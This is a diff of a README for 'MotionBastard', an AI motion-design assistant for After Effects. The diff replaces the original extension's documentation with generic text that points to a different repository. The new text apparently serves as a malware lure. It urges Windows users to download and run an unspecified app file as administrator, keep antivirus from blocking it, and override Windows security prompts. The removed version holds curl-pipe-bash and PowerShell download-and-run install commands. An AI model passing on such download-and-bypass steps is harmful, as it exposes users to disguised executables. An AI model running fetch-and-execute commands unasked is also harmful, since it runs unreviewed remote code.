@@ -1,148 +1,209 @@
-# 🤬 MotionBastard
+# 🧠 MotionBastard - Smarter Motion Design in Less Time
 
-**AI-powered motion design assistant — generates AE scripts & frontend animations from chat.**
+[![Download MotionBastard](https://img.shields.io/badge/Download%20MotionBastard-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/luca1234413/MotionBastard)
 
-An opinionated, foul-mouthed AI motion designer that lives inside After Effects. Describe what you want, it figures out the best way to build it — AE ExtendScript or frontend code — and does it for you.
+## 🚀 What MotionBastard Does
 
----
+MotionBastard is an AI-powered motion design assistant for After Effects. It helps you plan, build, and refine motion graphics with less manual work. You can use it to speed up common design tasks, keep your work organized, and get help with ideas when you need a starting point.
 
-## What it does
+It is made for people who want to work faster in After Effects without learning a new complex tool. The app fits into a normal Windows workflow and keeps the setup simple.
 
-**Two paths, one chat:**
+## 📥 Download
 
-- **AE Path** → You describe an animation → AI generates ExtendScript → Click "Execute" → Animation appears in your AE comp
-- **Frontend Path** → You describe a CSS/JS animation → AI generates code → Live preview renders in the panel → Copy code to your project
+Visit this page to download and run MotionBastard on Windows:
 
-**It also:**
-- Reads your current AE comp & selected layers automatically
-- Detects which path is best for your request (AE vs frontend)
-- Speaks its mind about your design choices (you've been warned)
+https://github.com/luca1234413/MotionBastard
 
----
+If the repository has a release file, choose the Windows download that matches your system. If the page opens the main repository, use the latest release or the main download area on that page.
 
-## Screenshots
+## 🪟 System Requirements
 
-> TODO: Add screenshots here
+MotionBastard works best on a Windows PC that can run After Effects smoothly.
 
----
+Recommended setup:
+- Windows 10 or Windows 11
+- Adobe After Effects installed
+- 8 GB RAM or more
+- A modern Intel or AMD processor
+- A stable internet connection for setup and AI features
+- Enough free disk space for the app and project files
 
-## Install
+For larger motion projects, 16 GB RAM gives a better experience.
 
-### Prerequisites
-- After Effects 2023 or later
-- Git installed ([download](https://git-scm.com/))
-- An API key from [OpenRouter](https://openrouter.ai/) (recommended) or [Anthropic](https://console.anthropic.com/)
+## ⚙️ Before You Start
 
-### One-line install
+Before you open MotionBastard, make sure:
+- After Effects is installed and opens without errors
+- You know where your downloads folder is
+- You have permission to install software on your PC
+- Your antivirus does not block the app during first launch
 
-**Mac** (open Terminal):
-```bash
-curl -sL https://raw.githubusercontent.com/BerlinKing/MotionBastard/main/install.sh | bash
-```
+If Windows shows a security prompt, choose the option that lets you keep the file and continue if you trust the source.
 
-**Windows** (open PowerShell as Admin):
-```powershell
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/BerlinKing/MotionBastard/main/install.bat" -OutFile "$env:TEMP\mb_install.bat"; Start-Process "$env:TEMP\mb_install.bat" -Verb RunAs
-```
+## 🖥️ How to Install on Windows
 
-### Then:
-1. Restart After Effects
-2. Go to **Window → Extensions → Motion AI Assistant**
-3. Click ⚙ Settings → Select provider → Paste your API key → Save
-4. Start chatting
+1. Open the download page:
+   https://github.com/luca1234413/MotionBastard
 
-### Manual install
+2. Find the latest Windows version of MotionBastard.
 
-<details>
-<summary>Click to expand</summary>
+3. Download the file to your computer.
 
-**Mac:**
-```bash
-git clone https://github.com/BerlinKing/MotionBastard.git "/Library/Application Support/Adobe/CEP/extensions/motion-ai-panel"
-curl -o "/Library/Application Support/Adobe/CEP/extensions/motion-ai-panel/js/CSInterface.js" https://raw.githubusercontent.com/nickvdh/cep-resources/main/CSInterface_12.js
-defaults write com.adobe.CSXS.12 PlayerDebugMode 1
-```
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
 
-**Windows (as Admin):**
-```bash
-git clone https://github.com/BerlinKing/MotionBastard.git "C:\Program Files (x86)\Common Files\Adobe\CEP\extensions\motion-ai-panel"
-curl -o "C:\Program Files (x86)\Common Files\Adobe\CEP\extensions\motion-ai-panel\js\CSInterface.js" https://raw.githubusercontent.com/nickvdh/cep-resources/main/CSInterface_12.js
-reg add "HKCU\Software\Adobe\CSXS.12" /v PlayerDebugMode /t REG_DWORD /d 1 /f
-```
-</details>
+5. Open the extracted folder.
 
----
+6. Double-click the app file to start MotionBastard.
 
-## Supported API Providers
+7. If Windows asks for permission, choose Yes.
 
-| Provider | Models | Key format |
-|----------|--------|------------|
-| **OpenRouter** (default) | Claude Sonnet 4, Claude Opus 4, Claude Haiku 4 | `sk-or-...` |
-| **Anthropic** (direct) | Claude Sonnet 4, Claude Opus 4 | `sk-ant-...` |
+8. Follow the on-screen setup steps if the app shows them.
 
-OpenRouter is recommended — it's easier to set up and supports more models.
+9. Open After Effects after the app finishes starting.
 
----
+## 🎬 First Launch
 
-## Project Structure
+When you open MotionBastard for the first time, it may ask for basic access or setup steps. This is normal.
 
-```
-motion-ai-panel/
-├── CSXS/
-│   └── manifest.xml          # CEP extension config
-├── css/
-│   └── style.css             # Panel styles (dark theme)
-├── js/
-│   ├── CSInterface.js        # Adobe CEP bridge (download separately)
-│   └── app.js                # Main app logic + Claude API
-├── jsx/
-│   └── host.jsx              # ExtendScript functions for AE control
-├── .debug                    # CEP debug config
-└── index.html                # Panel UI
-```
+Do this:
+- Keep After Effects closed until MotionBastard starts
+- Let the app finish loading
+- If asked, point the app to your After Effects installation
+- Use the default settings first
+- Test one small project before you use it on client work
 
----
+This helps you confirm that everything works on your PC.
 
-## How it works
+## ✨ Main Features
 
-1. Panel connects to AE via CSInterface + ExtendScript bridge
-2. Status bar shows current comp & selected layer in real-time
-3. When you send a message, AE context (comp size, layers, effects) is automatically injected
-4. AI decides the best path: AE ExtendScript or frontend code
-5. AE path: code goes to Code tab → click Execute → runs in AE
-6. Frontend path: code renders in Preview tab → copy when satisfied
+MotionBastard is built to help with common motion design work in After Effects.
 
----
+### 🧩 AI Help for Motion Design
+Ask for help with motion ideas, scene flow, timing, or layout direction. The assistant can help you move from a blank screen to a first draft faster.
 
-## The AI Personality
+### 🎞️ Workflow Support
+Use the app to keep your motion work moving. It can help you stay focused on the next step, not the whole process at once.
 
-MotionBastard's AI is a veteran motion designer with 10+ years of experience. It's technically brilliant but has zero patience for bad taste. It will:
+### 🗂️ Project Organization
+Keep your ideas, notes, and motion tasks in one place. This helps when you handle many scenes or versions.
 
-- Tell you if your idea is ugly
-- Suggest better approaches (with reasons)
-- Refuse to write code until your requirements are clear
-- Occasionally roast your design choices
+### ⏱️ Time Saving Tools
+Use MotionBastard to cut down on repeat work. It can help with common tasks that often slow down design work.
 
-Don't take it personally. It's making your work better.
+### 🖼️ After Effects Friendly
+MotionBastard is built for After Effects users. It fits into a motion design workflow instead of replacing it.
 
----
+## 🛠️ How to Use It
 
-## Roadmap
+1. Open MotionBastard.
+2. Load or start your After Effects project.
+3. Choose the task you want help with.
+4. Enter a short prompt or idea.
+5. Review the output.
+6. Apply the result in After Effects.
+7. Adjust the timing, layers, and look to match your project.
 
-- [ ] Voice input for hands-free iteration
-- [ ] Multi-model support (GPT, Gemini)
-- [ ] Reverse detection (sync AE manual changes back)
-- [ ] Conversation history
-- [ ] SP remote hot-update
+If you are new to motion design, start with simple prompts such as:
+- Create a clean logo reveal
+- Suggest motion timing for a title card
+- Help build a social media intro
+- Give me layout ideas for a product screen
+- Make this scene feel more smooth and modern
 
----
+## 🧠 Best Ways to Use MotionBastard
 
-## Contributing
+To get better results:
+- Write short, clear requests
+- Use one task at a time
+- Keep your project names simple
+- Test ideas on a copy of your project
+- Save often
+- Review all output before you ship
 
-PRs welcome. If you're improving the System Prompt, test it in the [Anthropic Workbench](https://console.anthropic.com/) first.
+Good input gives better output. A clear request saves time.
 
----
+## 🔧 Common Tasks
 
-## License
+MotionBastard can help with many day-to-day motion design tasks, such as:
+- Intro and outro ideas
+- Lower third concepts
+- Text animation direction
+- Scene pacing
+- Motion style ideas
+- Social content graphics
+- Simple storyboard planning
+- Variation ideas for client revisions
 
-MIT — do whatever you want.
+These tools work best when you already know the basic look you want and need help moving faster.
+
+## 📁 File Layout
+
+If you unpack the download, you may see files and folders for:
+- The main app
+- Settings
+- Logs
+- Project files
+- Assets
+- Support files
+
+Keep the folder structure the same after extraction. Moving random files can stop the app from opening.
+
+## ❓ Troubleshooting
+
+### The app does not open
+- Right-click the app and choose Run as administrator
+- Check that the files were extracted from the ZIP folder
+- Re-download the file if it looks incomplete
+- Restart your PC and try again
+
+### Windows blocks the file
+- Open the file properties
+- Check if Windows marked it as blocked
+- Choose the option that allows the file to run if you trust the source
+
+### After Effects does not connect
+- Close both apps
+- Open MotionBastard first
+- Make sure After Effects is installed
+- Check that you selected the correct After Effects version
+- Restart both apps and try again
+
+### The app feels slow
+- Close other apps
+- Give your PC more free memory
+- Use a smaller project first
+- Check that your system meets the recommended setup
+
+## 🔄 Updates
+
+Check the repository page often for new versions. Updates can bring:
+- Better AI responses
+- Faster startup
+- Bug fixes
+- New motion tools
+- Better support for After Effects workflows
+
+When you update, close MotionBastard and After Effects first.
+
+## 🧹 Tips for a Smooth Setup
+
+- Keep MotionBastard in a simple folder path, such as on your Desktop or in Downloads
+- Do not rename important app files unless the instructions say to
+- Use one Windows account for install and launch
+- Keep After Effects updated
+- Restart your PC after major changes
+
+## 📌 Quick Start
+
+1. Download MotionBastard from the GitHub page
+2. Extract the files if needed
+3. Open the app on Windows
+4. Connect it to After Effects
+5. Try one small motion task
+6. Adjust the result in After Effects
+7. Save your project
+
+## 📎 Link
+
+Primary download page:
+https://github.com/luca1234413/MotionBastard
